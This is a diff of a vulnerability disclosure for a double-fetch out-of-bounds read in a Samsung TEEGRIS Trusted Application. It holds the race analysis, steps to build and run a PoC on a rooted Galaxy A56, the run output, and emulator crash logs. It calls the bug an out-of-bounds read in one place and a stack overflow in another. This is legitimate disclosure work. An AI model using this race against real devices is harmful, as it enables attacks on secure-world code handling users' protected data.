@@ -1,15 +1,18 @@
 
-An out-of-bounds read vulnerability exists in a Trusted Application (UUID: 00000000-0000-0000-0000-4662436b6d52) running on Samsung's TEEGRIS, caused by inconsistent values obtained through a double-fetch problem.
+An out-of-bounds read vulnerability exists in a Trusted Application (UUID: 00000000-0000-0000-0000-4662436b6d52) running on Samsung's TEEGRIS. The issue is caused by inconsistent values resulting from double fetches of allocated shared memory between the normal world and the secure world. An attacker in the normal world can easily manipulate this shared memory to influence the behavior of the Trusted Application in the secure world.
 
 ## Device Information
 
-The build fingerprint of the device is `TODO`
+The build fingerprint of the device is `samsung/a56xnaeea/a56x:15/AP3A.240905.015.A2/A566BXXS6AYGE_OXM6AYGE:user/release-keys`
 
 The sha1 of the TA is `0fa082207a6cbc294983ed95f5dcba2a679056ec`
 
 ## Detailed Vulnerability Analysis
 
-Attackers in the REE can invoke `TA_InvokeCommandEntryPoint` through `TEEC_InvokeCommand`. By supplying `TEE_Param params[4]` together with an appropriate `uint32_t paramTypes`, the execution flow is directed to `tz_process_command`. Note that the attackers place the shared memory buffer between the REE and the TEE in `params` by assigning `TEEC_MEMREF_*` to `param_types`.
+Attackers in the REE can invoke `TA_InvokeCommandEntryPoint` through `TEEC_InvokeCommand`. By supplying `TEE_Param params[4]` together with an appropriate `uint32_t paramTypes`, the control flow is routed to `tz_process_command`. 
+
+In this process, attackers pass the shared memory buffer between the REE and the TEE through the `params` array by setting the `param_types` fields to `TEEC_MEMREF_*`.
+
 
 In the following, we focus only on `*params` and `params[1]`.
 
@@ -215,107 +218,8 @@ Subsequently, at the same memory position, the inner data length (at offset 4 of
 At this point, the attacker only needs to modify the inner data length before the second fetch at line 6 to a value smaller than 0x80001 (0x8002 in the POC) so that it passes the check at line 7. As a result, subsequent uses of `param_1`, e.g., `memcpy()` in `buggy_func_to_crash`, can lead to an out-of-bounds read to a completely invalid buffer.
 
 
-## Screenshots for Validity
-
-TODO
-
-
-For more details, there are some logs for reference.
-
-```C
-[=]     [TA_CreateEntryPoint] start @0x55555555f6b4
-[=]     [TA_CreateEntryPoint] reach end @0x55555555f704
-[=]     [TA_OpenSessionEntryPoint] start @0x55555555f75c
-[=]     snprintf: len: 0x100 "b'FK [WRN] (TA_OpenSessionEntryPoint:80) \x00'" written to 0x55555558d014, lr: 0x55555555f9a8
-[=]     snprintf: len: 0x100 "b'FK [WRN] (TA_OpenSessionEntryPoint:80) Start fk version 0.1.00\x00'" written to 0x55555558d114, lr: 0x55555555f7c0
-[=]     printf: FK [WRN] (TA_OpenSessionEntryPoint:80) Start fk version 0.1.00
-
-[=]     open called for /dev/kmsg returning fd 5
-[=]     strlen 0x55555558d114: 62
-[=]     [TA_OpenSessionEntryPoint] reach end @0x55555555f80c
-[=]     TEEC_RegisterSharedMemory 0x13337 0x70ba73f5f000 0x1000
-[=]     TEEC_RegisterSharedMemory 0x13338 0x70ba73f1d000 0x1000
-[=]     [TA_InvokeCommandEntryPoint] start @0x55555555f554
-[=]     TEES_IsREESharedMemory returning 0
-[=]     TEES_IsREESharedMemory returning 0
-[=]     OPENSSL_malloc: allocated 0x10 at 0xaaaaa020
-[=]     redzone hook 0xaaaaa000
-[=]     redzone hook 0xaaaaa030
-[=]     OPENSSL_malloc: allocated 0x28 at 0xaaaab020
-[=]     redzone hook 0xaaaab000
-[=]     redzone hook 0xaaaab048
-[=]     memset 0x28 bytes of 0x0 fill to 0xaaaab020
-[=]     OPENSSL_malloc: allocated 0x10 at 0xaaaac020
-[=]     redzone hook 0xaaaac000
-[=]     redzone hook 0xaaaac030
-[=]     OPENSSL_malloc: allocated 0x800a at 0xaaaad020
-[=]     redzone hook 0xaaaad000
-[=]     redzone hook 0xaaab502a
-[=]     memcpy 0x800a from 0xbbbbe000 to 0xaaaad020
-[x]     =================[lr: 0x555555560988] [memcpy] memory corruption detected!!
-[x]     CPU Context:
-[x]     x0      : 0xaaaad020
-[x]     x1      : 0xbbbbe000
-[x]     x2      : 0x800a
-[x]     x3      : 0x1000
-[x]     x4      : 0x555555557ad4
-[x]     x5      : 0x555555558963
-[x]     x6      : 0x50
-[x]     x7      : 0x0
-[x]     x8      : 0x595e9fbd94fda700
-[x]     x9      : 0x595e9fbd94fda700
-[x]     x10     : 0x595e9fbd94fda700
-[x]     x11     : 0x7fff8
-[x]     x12     : 0x0
-[x]     x13     : 0x0
-[x]     x14     : 0x0
-[x]     x15     : 0x0
-[x]     x16     : 0x555555587ff0
-[x]     x17     : 0x99999290
-[x]     x18     : 0x0
-[x]     x19     : 0xaaaac020
-[x]     x20     : 0x800a
-[x]     x21     : 0xbbbbe000
-[x]     x22     : 0x800a
-[x]     x23     : 0x800a
-[x]     x24     : 0x10
-[x]     x25     : 0x0
-[x]     x26     : 0x0
-[x]     x27     : 0x0
-[x]     x28     : 0x0
-[x]     x29     : 0x8000002ddd30
-[x]     x30     : 0x555555560988
-[x]     sp      : 0x8000002ddd20
-[x]     pc      : 0xdeadbeef
-[x]     lr      : 0x555555560988
-[x]     cpacr_el1       : 0x300000
-[x]     pstate  : 0x3c5
-[x]     PC = 0x00000000deadbeef (unreachable)
-
-[x]     Memory map:
-[x]     Start            End              Perm    Label                                     Image
-[x]     00000099999000 - 0000009999a000   rwx     dl_resolve
-[x]     000000aaaaa000 - 000000aaaab000   rw-     malloc_chunk
-[x]     000000aaaab000 - 000000aaaac000   rw-     malloc_chunk
-[x]     000000aaaac000 - 000000aaaad000   rw-     malloc_chunk
-[x]     000000aaaad000 - 000000aaab6000   rw-     malloc_chunk
-[x]     000000bbbbb000 - 000000bbbbc000   rw-     session_id
-[x]     000000bbbbc000 - 000000bbbbd000   rw-     session_context
-[x]     000000bbbbd000 - 000000bbbbe000   rw-     TEE_Params
-[x]     000000bbbbe000 - 000000bbbbf000   rw-     shared_memory_0
-[x]     000000bbbbf000 - 000000bbbc0000   rw-     shared_memory_1
-[x]     000000eeeee000 - 000000eeef0000   rwx     [hook_mem]
-[x]     00555555554000 - 0055555555f000   r--     00000000-0000-0000-0000-4662436b6d52.ta   /srv/emulator/rootfs/00000000-0000-0000-0000-4662436b6d52.ta
-[x]     0055555555f000 - 00555555587000   r-x     00000000-0000-0000-0000-4662436b6d52.ta   /srv/emulator/rootfs/00000000-0000-0000-0000-4662436b6d52.ta
-[x]     00555555587000 - 00555555589000   rw-     00000000-0000-0000-0000-4662436b6d52.ta   /srv/emulator/rootfs/00000000-0000-0000-0000-4662436b6d52.ta
-[x]     0055555558a000 - 0055555558e000   rw-     00000000-0000-0000-0000-4662436b6d52.ta   /srv/emulator/rootfs/00000000-0000-0000-0000-4662436b6d52.ta
-[x]     007ffff7dd5000 - 007ffff7de1000   r-x     libtzld.so                                /srv/emulator/rootfs/lib64/libtzld.so
-[x]     007ffff7df1000 - 007ffff7df2000   rw-     libtzld.so                                /srv/emulator/rootfs/lib64/libtzld.so
-[x]     007ffffffde000 - 008000002de000   rwx     [stack]
-```
 
 ## Source code of the POC
-
 
 
 ```C
@@ -459,13 +363,126 @@ For reference, the dependent files for the PoC are attached here.
 - `tee.h`: Open-sourced in the OPTEE repo
 - `repro.h`: Contains basic utilities specific to this PoC, primarily handling parameter initialization, TEE Client API invocation, and character-related operations.
 - `libteecli.so`: Can be found at the device path ./vendor/lib64/libteecli.so.
-
+- `Makefile`: Helps to generate and push specific poc binary to the phone
 
 
 ## Vulnerability Reproduction
 
-1. preacquisition
-2. interaction
+
+We reproduced the poc on the Samsung Galaxy A56 5G (Model name: SM-A566B/DS)
 
 
+1. Compile the poc:
 
+```bash
+ANDROID_NDK=$(path to android ndk) make phone
+```
+
+Upload the generate `./poc` executable to `/data/local/tmp/`. 
+On the phone we used a magisk plugin for the root permission and writable core directories.
+
+
+2. Then run the poc for multiple times (race window is tight sometimes): 
+   
+```
+/data/local/tmp/poc
+```
+
+
+This poc triggers the stack overflow, which causes the TA to crash in the canary check.
+The poc prints the return code and error origin which will be, indicating the TA crashed.
+
+```bash
+a56x:/ # /data/local/tmp/poc
+Unable to detect domain.
+shm ptr 0x7d0f947000
+params: 0x6c
+Unable to detect domain.
+TEEC_Result: ffff3024 origin: err_origin: 3
+
+# TEEC_Result: ffff3024  -> TEE_ERROR_TARGET_DEAD
+# origin: err_origin: 3 -> TEEC_ORIGIN_TEE
+```
+
+
+### Screenshots for Validity
+
+![screenshots](pics/image.png)
+
+For more details, there are some logs in debugging mode of our customized emulator for reference.
+
+```C
+[=]     [TA_CreateEntryPoint] start @0x55555555f6b4
+[=]     [TA_CreateEntryPoint] reach end @0x55555555f704
+[=]     [TA_OpenSessionEntryPoint] start @0x55555555f75c
+[=]     snprintf: len: 0x100 "b'FK [WRN] (TA_OpenSessionEntryPoint:80) \x00'" written to 0x55555558d014, lr: 0x55555555f9a8
+[=]     snprintf: len: 0x100 "b'FK [WRN] (TA_OpenSessionEntryPoint:80) Start fk version 0.1.00\x00'" written to 0x55555558d114, lr: 0x55555555f7c0
+[=]     printf: FK [WRN] (TA_OpenSessionEntryPoint:80) Start fk version 0.1.00
+[=]     open called for /dev/kmsg returning fd 5
+[=]     strlen 0x55555558d114: 62
+[=]     [TA_OpenSessionEntryPoint] reach end @0x55555555f80c
+[=]     TEEC_RegisterSharedMemory 0x13337 0x70ba73f5f000 0x1000
+[=]     TEEC_RegisterSharedMemory 0x13338 0x70ba73f1d000 0x1000
+[=]     [TA_InvokeCommandEntryPoint] start @0x55555555f554
+[=]     TEES_IsREESharedMemory returning 0
+[=]     TEES_IsREESharedMemory returning 0
+[=]     OPENSSL_malloc: allocated 0x10 at 0xaaaaa020
+[=]     redzone hook 0xaaaaa000
+[=]     redzone hook 0xaaaaa030
+[=]     OPENSSL_malloc: allocated 0x28 at 0xaaaab020
+[=]     redzone hook 0xaaaab000
+[=]     redzone hook 0xaaaab048
+[=]     memset 0x28 bytes of 0x0 fill to 0xaaaab020
+[=]     OPENSSL_malloc: allocated 0x10 at 0xaaaac020
+[=]     redzone hook 0xaaaac000
+[=]     redzone hook 0xaaaac030
+[=]     OPENSSL_malloc: allocated 0x800a at 0xaaaad020
+[=]     redzone hook 0xaaaad000
+[=]     redzone hook 0xaaab502a
+[=]     memcpy 0x800a from 0xbbbbe000 to 0xaaaad020
+[x]     =================[lr: 0x555555560988] [memcpy] memory corruption detected!!
+[x]     CPU Context:
+[x]     x0      : 0xaaaad020
+[x]     x1      : 0xbbbbe000
+[x]     x2      : 0x800a
+[x]     x3      : 0x1000
+[x]     x4      : 0x555555557ad4
+[x]     x5      : 0x555555558963
+[x]     x6      : 0x50
+[x]     x7      : 0x0
+[x]     x8      : 0x595e9fbd94fda700
+[x]     x9      : 0x595e9fbd94fda700
+[x]     x10     : 0x595e9fbd94fda700
+[x]     x11     : 0x7fff8
+[x]     sp      : 0x8000002ddd20
+[x]     pc      : 0xdeadbeef
+[x]     lr      : 0x555555560988
+[x]     cpacr_el1       : 0x300000
+[x]     pstate  : 0x3c5
+[x]     PC = 0x00000000deadbeef (unreachable)
+
+[x]     Memory map:
+[x]     Start            End              Perm    Label                                     Image
+[x]     00000099999000 - 0000009999a000   rwx     dl_resolve
+[x]     000000aaaaa000 - 000000aaaab000   rw-     malloc_chunk
+[x]     000000aaaab000 - 000000aaaac000   rw-     malloc_chunk
+[x]     000000aaaac000 - 000000aaaad000   rw-     malloc_chunk
+[x]     000000aaaad000 - 000000aaab6000   rw-     malloc_chunk
+[x]     000000bbbbb000 - 000000bbbbc000   rw-     session_id
+[x]     000000bbbbc000 - 000000bbbbd000   rw-     session_context
+[x]     000000bbbbd000 - 000000bbbbe000   rw-     TEE_Params
+[x]     000000bbbbe000 - 000000bbbbf000   rw-     shared_memory_0
+[x]     000000bbbbf000 - 000000bbbc0000   rw-     shared_memory_1
+[x]     000000eeeee000 - 000000eeef0000   rwx     [hook_mem]
+[x]     00555555554000 - 0055555555f000   r--     00000000-0000-0000-0000-4662436b6d52.ta   /srv/emulator/rootfs/00000000-0000-0000-0000-4662436b6d52.ta
+[x]     0055555555f000 - 00555555587000   r-x     00000000-0000-0000-0000-4662436b6d52.ta   /srv/emulator/rootfs/00000000-0000-0000-0000-4662436b6d52.ta
+[x]     00555555587000 - 00555555589000   rw-     00000000-0000-0000-0000-4662436b6d52.ta   /srv/emulator/rootfs/00000000-0000-0000-0000-4662436b6d52.ta
+[x]     0055555558a000 - 0055555558e000   rw-     00000000-0000-0000-0000-4662436b6d52.ta   /srv/emulator/rootfs/00000000-0000-0000-0000-4662436b6d52.ta
+[x]     007ffff7dd5000 - 007ffff7de1000   r-x     libtzld.so                                /srv/emulator/rootfs/lib64/libtzld.so
+[x]     007ffff7df1000 - 007ffff7df2000   rw-     libtzld.so                                /srv/emulator/rootfs/lib64/libtzld.so
+[x]     007ffffffde000 - 008000002de000   rwx     [stack]
+```
+
+### Impact 
+
+An attacker **running in the normal world** (either as root or in the context of a process able to communicate with the tee drivers like `/dev/tee0` or `/dev/teepriv0`) can trigger this bug. 
